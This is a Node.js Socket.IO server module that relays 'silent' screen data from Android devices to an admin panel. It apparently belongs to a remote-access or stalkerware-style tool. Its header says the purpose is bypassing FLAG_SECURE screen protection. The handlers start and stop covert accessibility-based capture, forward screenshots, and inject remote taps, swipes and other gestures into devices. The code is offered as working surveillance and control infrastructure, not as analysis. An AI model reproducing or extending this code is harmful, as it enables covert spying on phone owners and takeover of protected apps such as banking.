/**
 * Silent Screen Stream Socket Handler
 * 
 * Handles the relay of accessibility node tree data from Android devices
 * to admin panel viewers for FLAG_SECURE bypass screen viewing.
 */

// Track which admins are watching silent streams
// Map<deviceId, Set<socketId>>
const silentStreamWatchers = new Map();

// Track active silent stream sessions
// Map<deviceId, { startTime, deviceSocketId }>
const activeSilentStreams = new Map();

/**
 * Setup silent stream socket handlers
 * @param {import('socket.io').Server} io - Socket.IO server instance
 * @param {import('socket.io').Socket} socket - Individual socket connection
 */
function setupSilentStreamHandlers(io, socket) {

    /**
     * Admin joins silent stream room for a device
     */
    socket.on('silent-screen:join', ({ deviceId }) => {
        if (!deviceId) return;

        socket.join(`silent-stream:${deviceId}`);

        // Track this admin as a watcher
        if (!silentStreamWatchers.has(deviceId)) {
            silentStreamWatchers.set(deviceId, new Set());
        }
        silentStreamWatchers.get(deviceId).add(socket.id);

        console.log(`[SILENT] Admin joined silent stream: ${deviceId} (${silentStreamWatchers.get(deviceId).size} watchers)`);

        // Check if already streaming
        const activeStream = activeSilentStreams.get(deviceId);
        socket.emit('silent-screen:status', {
            deviceId,
            isActive: !!activeStream,
            ...(activeStream || {})
        });
    });

    /**
     * Admin leaves silent stream room
     */
    socket.on('silent-screen:leave', ({ deviceId }) => {
        if (!deviceId) return;

        socket.leave(`silent-stream:${deviceId}`);

        // Remove watcher
        if (silentStreamWatchers.has(deviceId)) {
            silentStreamWatchers.get(deviceId).delete(socket.id);

            // If no more watchers, stop the stream on device
            if (silentStreamWatchers.get(deviceId).size === 0) {
                console.log(`[SILENT] Last viewer left - stopping silent stream: ${deviceId}`);
                io.to(`device:${deviceId}`).emit('command:execute', {
                    id: `silent-stop-${Date.now()}`,
                    type: 'stop_silent_screen',
                    payload: {}
                });
                activeSilentStreams.delete(deviceId);
                silentStreamWatchers.delete(deviceId);
            }
        }
    });

    /**
     * Admin requests to start silent screen capture
     */
    socket.on('silent-screen:start', ({ deviceId }) => {
        if (!deviceId) return;

        console.log(`[SILENT] Start request for: ${deviceId}`);

        // Send command to device to start capture
        io.to(`device:${deviceId}`).emit('command:execute', {
            id: `silent-start-${Date.now()}`,
            type: 'start_silent_screen',
            payload: {}
        });

        // Track as active
        activeSilentStreams.set(deviceId, {
            startTime: Date.now(),
            requesterSocketId: socket.id
        });
    });

    /**
     * Admin requests to stop silent screen capture
     */
    socket.on('silent-screen:stop', ({ deviceId }) => {
        if (!deviceId) return;

        console.log(`[SILENT] Stop request for: ${deviceId}`);

        // Send command to device to stop capture
        io.to(`device:${deviceId}`).emit('command:execute', {
            id: `silent-stop-${Date.now()}`,
            type: 'stop_silent_screen',
            payload: {}
        });

        // Clear tracking
        activeSilentStreams.delete(deviceId);
    });

    /**
     * Screen tree data from device - forward to watchers
     */
    socket.on('silent-screen:data', (data) => {
        const { deviceId, ...treeData } = data;

        // Get deviceId from connected devices if not in payload
        const actualDeviceId = deviceId || getDeviceIdFromSocket(socket);
        if (!actualDeviceId) return;

        // Update active stream tracking
        if (!activeSilentStreams.has(actualDeviceId)) {
            activeSilentStreams.set(actualDeviceId, {
                startTime: Date.now()
            });
        }

        // Forward to all watchers
        io.to(`silent-stream:${actualDeviceId}`).emit('silent-screen:update', {
            deviceId: actualDeviceId,
            ...treeData
        });
    });

    /**
 * Status update from device
 */
    socket.on('silent-screen:status', (data) => {
        const deviceId = getDeviceIdFromSocket(socket);
        if (!deviceId) return;

        console.log(`[SILENT] Status from ${deviceId}: ${data.status}`);

        if (data.status === 'started') {
            activeSilentStreams.set(deviceId, {
                startTime: Date.now(),
                screenWidth: data.screenWidth,
                screenHeight: data.screenHeight
            });
            io.to(`silent-stream:${deviceId}`).emit('silent-screen:started', {
                deviceId,
                screenWidth: data.screenWidth,
                screenHeight: data.screenHeight
            });
        } else if (data.status === 'stopped') {
            activeSilentStreams.delete(deviceId);
            io.to(`silent-stream:${deviceId}`).emit('silent-screen:stopped', { deviceId });
        }
    });

    /**
     * Remote touch from admin - forward to device (legacy)
     */
    socket.on('silent-screen:touch', (data) => {
        const { deviceId, ...touchData } = data;
        if (!deviceId) return;

        console.log(`[SILENT] Touch for ${deviceId}: ${touchData.type} at (${touchData.x}, ${touchData.y})`);

        // Forward to device for gesture injection
        io.to(`device:${deviceId}`).emit('remote:touch', touchData);
    });

    /**
     * Advanced gestures from admin - forward to device
     * Supports: tap, longpress, swipe, double_tap, drag, doodle
     */
    socket.on('silent-screen:gesture', (data) => {
        const { deviceId, ...gestureData } = data;
        if (!deviceId) return;

        console.log(`[SILENT] Gesture for ${deviceId}: ${gestureData.type}`, {
            start: `(${gestureData.startX?.toFixed(3)}, ${gestureData.startY?.toFixed(3)})`,
            end: gestureData.endX ? `(${gestureData.endX?.toFixed(3)}, ${gestureData.endY?.toFixed(3)})` : 'N/A',
            direction: gestureData.direction || 'N/A'
        });

        // Forward to device for gesture injection
        io.to(`device:${deviceId}`).emit('remote:gesture', gestureData);
    });

    /**
     * Admin requests a screenshot for background rendering
     */
    socket.on('silent-screen:capture-background', ({ deviceId }) => {
        if (!deviceId) return;

        console.log(`[SILENT] Background screenshot request for: ${deviceId}`);

        // Send command to device to capture a screenshot
        io.to(`device:${deviceId}`).emit('command:execute', {
            id: `silent-screenshot-${Date.now()}`,
            type: 'capture_accessibility_screenshot',
            payload: {}
        });
    });

    /**
     * Screenshot data from device - forward to requesting admin
     */
    socket.on('silent-screen:screenshot-data', (data) => {
        const deviceId = getDeviceIdFromSocket(socket);
        if (!deviceId) return;

        console.log(`[SILENT] Screenshot received from ${deviceId}, size: ${data.imageData?.length || 0} bytes`);

        // Forward to all watchers of this device
        io.to(`silent-stream:${deviceId}`).emit('silent-screen:screenshot', {
            deviceId,
            imageData: data.imageData
        });
    });

    /**
     * Handle socket disconnect - cleanup watchers
     */
    socket.on('disconnect', () => {
        // Remove from all silent stream watcher lists
        for (const [watchedDeviceId, watchers] of silentStreamWatchers.entries()) {
            if (watchers.has(socket.id)) {
                watchers.delete(socket.id);
                console.log(`[SILENT] Watcher disconnected from ${watchedDeviceId}`);

                // If no more watchers, stop the stream
                if (watchers.size === 0) {
                    console.log(`[SILENT] No watchers left - stopping: ${watchedDeviceId}`);
                    io.to(`device:${watchedDeviceId}`).emit('command:execute', {
                        id: `silent-stop-${Date.now()}`,
                        type: 'stop_silent_screen',
                        payload: {}
                    });
                    activeSilentStreams.delete(watchedDeviceId);
                    silentStreamWatchers.delete(watchedDeviceId);
                }
            }
        }
    });
}

// Helper to get device ID from socket (using shared state)
function getDeviceIdFromSocket(socket) {
    try {
        const { connectedDevices } = require('../shared/state');
        return connectedDevices.get(socket.id);
    } catch (e) {
        return null;
    }
}

module.exports = {
    setupSilentStreamHandlers,
    silentStreamWatchers,
    activeSilentStreams
};
